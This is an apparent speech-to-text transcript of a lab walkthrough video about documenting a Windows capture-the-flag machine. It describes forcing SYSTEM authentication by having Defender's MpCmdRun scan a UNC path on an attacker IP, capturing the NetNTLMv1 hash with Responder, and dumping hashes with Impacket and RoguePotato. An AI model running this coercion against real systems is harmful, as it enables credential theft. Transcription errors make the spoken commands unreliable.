accounts um we may want to say when administrator paste this and the note will be um secrets dump with apt there we go so enumeration tools this is the last thing we took notes on so we should probably escape all these slashes and we're going to have to uh we're not going to modify like everything and we didn't unpack it we should but i mean i wasn't taking good notes as we went so i won't do that uh you can probably go to like oxdf's right up we worked on it together so errors are going to be ex not exactly but pretty much the same so after enumeration tools uh we did net ntlm or net ntlm b1 defender so we have to explain how we got this nt hash oops here we go so defender i wonder if we still have it here um was it mp scan we don't so defender when running mp scan defender uses the system user in this case it's apt because it's kind of like a set uid binary linux that mp scan whenever you run it it communicates to a service over a named pipe and that service initiates the scan so that service is running a system and it's apt and say this is patched on latest windows well that part's not patched um apt if scanning a unc path we can force system to authenticate to us which is patched on latest windows and this is just something i know you would research that like defender thing or try it on an environment to see if it works and come to the conclusion uh microsoft did patch that and that is a relatively recent patch because this machine came out like within the last four months so if scanning unc path has passed from the latest windows due to the lm compatibility level being two that ntlm v1 can be used which allows cracking the hash and for the notes um i guess we can run this again let's exit this and go into henry vinson and let's exit that uh we want to remove the impacted thing so remove user user share impact it not packet responder responder.db uh we have to pseudo remove that there we go so we can say responder dash i ton zero dash dash lm sudo there we go and this one we do mp scan so this was in cd program files uh what cd backslash program files and this is just shorthand way to write program files if you do squiggly 2 or to do program files x86 we're in windows defender there's mpscan in here let's see mp scan is there a bin uh let's see let's just look for dir or not dir um exe and shoot d-i-r select string exe oh shoot i just did a strings against the dir command i was hoping to like pipe it and then just look for exes oh mp cmd run this is what it is so we can do mp cmd run dash scan dash scan type 3 dash file 10 10 14 3 slash um t uh let's just say oh god 10 10 14 3 slash please subscribe slash file i'm going to copy this because i want to paste it in a window here so it's clean for the screenshot let's see uh let's see mpcmdrun.exe what if i do dot backslash there we go and that should be good so we can take a screenshot uh there we go copy and then grab that actually yeah that's fine paste the screenshot so now our defender has a pretty screenshot and then we can say 40. um this will be rogue potato and what we can do is put this as a second and this will be rogue potato and create a new note this is kind of why we do the numbers we'll call this 33 go halfway between getting apt hash and then we just put that into this folder so when we combine all these files we just inserted this before ntlm and uh before defender and rogue potato and we can say getting apt hash the lm compatibility level allows net until mv one there's at least two ways to force the system to make a connection where the attacker could steal this hash there we go uh there was a typo i made and allows there we go so now if you combine this you'd have this being the parent and then going into subtopics so rug broke potato um i'm just going to i highly like do a high level of steps modify rogue potato to allow ipv6 modify and pack it to allow rpc servers and dump hashes so that would pretty much be what i do here and i'd probably review this note and just be furious but um at this point i'd probably just like tire this up so tara cjvf and packet 921 and i'd call this and pack it dash rogue ntlmv1 steel and then put this folder somewhere on a repo i have so i can always have this so yeah that'll be the video hope you guys enjoyed it take care and i will see you all next week